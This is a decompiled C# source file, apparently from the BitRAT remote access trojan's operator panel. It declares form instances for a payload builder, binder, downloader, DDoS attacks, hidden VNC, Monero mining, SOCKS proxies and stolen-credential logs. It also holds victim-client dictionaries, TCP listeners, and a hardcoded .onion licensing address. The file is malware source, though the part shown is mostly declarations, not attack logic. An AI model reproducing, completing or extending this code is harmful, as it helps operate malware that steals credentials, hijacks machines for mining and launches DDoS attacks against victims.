﻿using BitRAT;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class Class130
{
    public static fMain fMain_0 = new fMain();
    public static fSettings fSettings_0 = new fSettings();
    public static fConnectionLog fConnectionLog_0 = new fConnectionLog();
    public static fBuilder fBuilder_0 = new fBuilder();
    public static fBuilderBinder fBuilderBinder_0 = new fBuilderBinder();
    public static fBuilderDownloader fBuilderDownloader_0 = new fBuilderDownloader();
    public static fCertificate fCertificate_0 = new fCertificate();
    public static fOnJoin fOnJoin_0 = new fOnJoin();
    public static fUpdate fUpdate_0 = new fUpdate();
    public static fHWIDUpdate fHWIDUpdate_0 = new fHWIDUpdate();
    public static fPayment fPayment_0 = new fPayment();
    public static fPaymentDDoS fPaymentDDoS_0 = new fPaymentDDoS();
    public static fPaymentHVNC fPaymentHVNC_0 = new fPaymentHVNC();
    public static fTransferManager fTransferManager_0 = new fTransferManager();
    public static fMinerXMR fMinerXMR_0 = new fMinerXMR();
    public static fDDOS fDDOS_0 = new fDDOS();
    public static fSocks5 fSocks5_0 = new fSocks5();
    public static fSocks4R fSocks4R_0 = new fSocks4R();
    public static fTorConfig fTorConfig_0 = new fTorConfig();
    public static fSplash fSplash_0 = new fSplash();
    public static fMinerXMRLogManager fMinerXMRLogManager_0 = new fMinerXMRLogManager();
    public static fCredentialsLogins fCredentialsLogins_0 = new fCredentialsLogins();
    public static long long_0;
    public static Struct20 struct20_0 = new Struct20();
    public static long long_1;
    public static ConcurrentDictionary<string, cTransfer> concurrentDictionary_0 = new ConcurrentDictionary<string, cTransfer>();
    public static ConcurrentDictionary<string, int> concurrentDictionary_1 = new ConcurrentDictionary<string, int>();
    public static ConcurrentDictionary<string, cLogCon> concurrentDictionary_2 = new ConcurrentDictionary<string, cLogCon>();
    public static ConcurrentDictionary<string, CClient> concurrentDictionary_3 = new ConcurrentDictionary<string, CClient>();
    public static ConcurrentDictionary<string, cMinerXMRcli> concurrentDictionary_4 = new ConcurrentDictionary<string, cMinerXMRcli>();
    public static ConcurrentDictionary<string, cDOScli> concurrentDictionary_5 = new ConcurrentDictionary<string, cDOScli>();
    public static ConcurrentDictionary<string, cSocks5cli> concurrentDictionary_6 = new ConcurrentDictionary<string, cSocks5cli>();
    public static ConcurrentDictionary<string, cSocks4Rcli> concurrentDictionary_7 = new ConcurrentDictionary<string, cSocks4Rcli>();
    public static ConcurrentDictionary<string, cCredentialsUser> concurrentDictionary_8 = new ConcurrentDictionary<string, cCredentialsUser>();
    public static ConcurrentDictionary<string, cFWIP> concurrentDictionary_9 = new ConcurrentDictionary<string, cFWIP>();
    public static ConcurrentDictionary<string, string> concurrentDictionary_10 = new ConcurrentDictionary<string, string>();
    public static int int_0;
    public static IPAddress ipaddress_0;
    public static int int_1;
    public static IPAddress ipaddress_1;
    public static ConcurrentQueue<cFWIP> concurrentQueue_0 = new ConcurrentQueue<cFWIP>();
    public static ConcurrentQueue<cFWIP> concurrentQueue_1 = new ConcurrentQueue<cFWIP>();
    public static ConcurrentQueue<cFWIP> concurrentQueue_2 = new ConcurrentQueue<cFWIP>();
    public static TcpListener tcpListener_0;
    public static TcpListener tcpListener_1;
    public static ImageList imageList_0;
    public static ImageList imageList_1;
    public static Struct18 struct18_0;
    public static Struct7 struct7_0;
    public static Struct18 struct18_1;
    public static Struct7 struct7_1;
    public static Socket socket_0;
    public static Struct18 struct18_2;
    public static Struct18 struct18_3;
    public static Struct3 struct3_0;
    public static Struct18 struct18_4;
    public static Struct7 struct7_2;
    public static Process process_0;
    public static Process process_1;
    public static Struct18 struct18_5;
    public static Struct18 struct18_6;
    public static Struct18 struct18_7;
    public static Struct18 struct18_8;
    public static Struct18 struct18_9;
    public static long long_2;
    public static long long_3;
    public static Struct3 struct3_1;
    public static Struct3 struct3_2;
    public static Struct3 struct3_3;
    public static Struct3 struct3_4;
    public static Struct3 struct3_5;
    public static Struct3 struct3_6;
    public static Struct3 struct3_7;
    public static Struct7 struct7_3;
    public static Struct18 struct18_10;
    public static Struct18 struct18_11;
    public static Struct18 struct18_12;
    public static Struct3 struct3_8;
    public static Struct18 struct18_13;
    public static Mutex mutex_0;
    public static cIPInfo.STRUCT_GEO[] struct_GEO_0;
    public static Struct3 struct3_9;
    public static long long_4;

    static Class130()
    {
        ImageList list1 = new ImageList();
        list1.ImageSize = new Size(0x10, 12);
        imageList_0 = list1;
        ImageList list2 = new ImageList();
        list2.ImageSize = new Size(0x100, 160);
        imageList_1 = list2;
        socket_0 = null;
        struct3_1 = new Struct3("m-X60m-X60");
        struct3_2 = new Struct3("m-X60m-X60");
        struct3_3 = new Struct3("m-X60m-X60");
        struct3_4 = new Struct3("m-X60m-X60");
        struct3_5 = new Struct3("m-X60m-X60");
        string str = "http://unknownposdhmyrm.onion";
        struct3_6.method_3(str);
        string str2 = "/lic.php";
        struct3_7.method_3(str2);
        string str3 = "1.27";
        struct3_8.method_3(str3);
        string str4 = "CDE61C76846D06EC0612FD2A3D7A71E2BC908FD89601EA50C45E449EEC02B3A7";
        struct3_9.method_3(str4);
    }

    [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    public static extern int GetScrollInfo(IntPtr intptr_0, int int_2, ref Struct21 struct21_0);
    [DllImport("user32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    public static extern int SendMessageA(IntPtr intptr_0, int int_2, int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);
    [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    public static extern int SetScrollInfo(IntPtr intptr_0, int int_2, ref Struct21 struct21_0, bool bool_0);
    [DllImport("user32")]
    public static extern bool ShowScrollBar(IntPtr intptr_0, int int_2, bool bool_0);

    public enum Enum3
    {
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct Struct19
    {
        public long long_0;
        public long long_1;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct Struct20
    {
        public double double_0;
        public double double_1;
        public double double_2;
        public double double_3;
        public double double_4;
        public double double_5;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct Struct21
    {
        public int int_0;
        public int int_1;
        public int int_2;
        public int int_3;
        public int int_4;
        public int int_5;
        public int int_6;
    }
}

